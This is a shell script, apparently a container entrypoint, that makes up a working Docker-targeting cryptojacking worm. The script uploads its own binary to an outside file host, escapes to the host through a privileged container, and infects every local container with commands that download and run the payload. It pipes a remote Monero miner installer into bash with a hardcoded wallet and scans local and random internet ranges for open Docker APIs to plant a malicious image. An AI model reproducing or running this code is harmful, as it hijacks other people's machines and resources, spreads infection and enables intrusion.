#!/bin/bash
#
#   File:     entrypoint.sh
#   Path      /usr/local/bin/entrypoint.sh
#
# Variables
RATESCAN="50000"
SETUP_SLEEP="1"

function SETUP_SYSTEM(){
    apk update
    apk add --no-cache --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing hwloc-dev

    BASIC_APK_PACKS=(go git jq masscan libpcap libpcap-dev docker make cmake upx libstdc++ gcc g++ libuv-dev iptables openssl openssl-dev hwloc-dev)
    for BASIC_APK_PACK in "${BASIC_APK_PACKS[@]}"; do
        echo "setup: $BASIC_APK_PACK"
        apk add --no-cache "$BASIC_APK_PACK" >/dev/null 2>&1
        sleep "$SETUP_SLEEP"
    done

    export GOPATH=/root/go
    git clone https://github.com/zmap/zmap /tmp/zmap
    cd /tmp/zmap
    cmake .
    make -j4

    git clone https://github.com/zmap/zgrab /tmp/zgrab
    cd /tmp/zgrab
    go mod init github.com/zmap/zgrab
    go mod tidy
    go build
    go mod vendor
    make
    cp ./zgrab /usr/bin/zgrab
    rm -rf /var/cache/apk/*
    /usr/local/bin/setup_xmrig.sh

    # Lil upspin test
    export UPSPINTEST=$(curl --upload-file /root/sbin https://filepush.co/upload/)

    # Implement the ssh spread
    cp /root/sbin /host/bin/sbin
    docker run -it --privileged --network host -v /:/mnt alpine chroot /mnt bash -C 'chmod +x /host/bin/sbin; /host/bin/sbin'
}

function INFECT_ALL_CONTAINERS(){
    docker ps | awk '{print $1}' | grep -v grep | grep -v CONTAINER >> /tmp/.dc
    for i in $(cat /tmp/.dc); do
        docker exec --privileged -d "$i" sh -c "apk update; apk add wget curl; mkdir -p /var/tmp/; wget --no-check-certificate $UPSPINTEST -O /var/tmp/sbin; /var/tmp/sbin || curl -sLk $UPSPINTEST -o /var/tmp/sbin; chmod +x /var/tmp/sbin; /var/tmp/sbin"
    done
    export HOME=/root
    nohup $(curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 4AYe7ZbZEAMezv8jVqnagtWz24nA8dkcPaqHa8p8MLpqZvcWJSk7umPNhDuoXM2KRXfoCB7N2w2ZTLmTPj5GgoTvBipk1s9) &
}

function GETLOCALRANGES(){
    ip route show | awk '{print $1}' |  grep "/" > /tmp/.lr
}

function AUTOLANDOCKERPWN(){
    TARGETRANGE=$1
    TARGETPORT=$2
    SCANRATE=$3
    rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6; echo '')
    eval "$rndstr"="'$(masscan $TARGETRANGE -p$TARGETPORT --rate=$SCANRATE | awk '{print $6}' | zgrab --senders 200 --port $TARGETPORT --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip)'"

    for TARGETIP in ${!rndstr}; do
        echo "$TARGETIP:$TARGETPORT"
        timeout -s SIGKILL 240s docker -H tcp://$TARGETIP:$TARGETPORT run -d --privileged --network host -v /:/host nmlmweb3/alpine_upspin:latest
    done
}

function LANDOCKERPWN(){
    GETLOCALRANGES
    while read -r TargetRange; do
        echo "scanning $TargetRange"
        AUTOLANDOCKERPWN "$TargetRange" 2375 "$RATESCAN"
        AUTOLANDOCKERPWN "$TargetRange" 2376 "$RATESCAN"
        AUTOLANDOCKERPWN "$TargetRange" 2377 "$RATESCAN"
        AUTOLANDOCKERPWN "$TargetRange" 4243 "$RATESCAN"
        AUTOLANDOCKERPWN "$TargetRange" 4244 "$RATESCAN"
        AUTOLANDOCKERPWN "$TargetRange" 5555 "$RATESCAN"
    done < /tmp/.lr
    rm -f /tmp/.lr
}

function RANDOMDOCKERPWN(){
    for (( ; ; )); do
        TargetRange="$[RANDOM%255+1].0.0.0/8"
        echo "scanning $TargetRange"
        AUTOLANDOCKERPWN "$TargetRange" 2375 "$RATESCAN"
        AUTOLANDOCKERPWN "$TargetRange" 2376 "$RATESCAN"
        AUTOLANDOCKERPWN "$TargetRange" 2377 "$RATESCAN"
        AUTOLANDOCKERPWN "$TargetRange" 4243 "$RATESCAN"
        AUTOLANDOCKERPWN "$TargetRange" 4244 "$RATESCAN"
        AUTOLANDOCKERPWN "$TargetRange" 5555 "$RATESCAN"
        sleep 1
    done
}

SETUP_SYSTEM
export HOME=/root
curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 4AYe7ZbZEAMezv8jVqnagtWz24nA8dkcPaqHa8p8MLpqZvcWJSk7umPNhDuoXM2KRXfoCB7N2w2ZTLmTPj5GgoTvBipk1s9
INFECT_ALL_CONTAINERS
LANDOCKERPWN
RANDOMDOCKERPWN
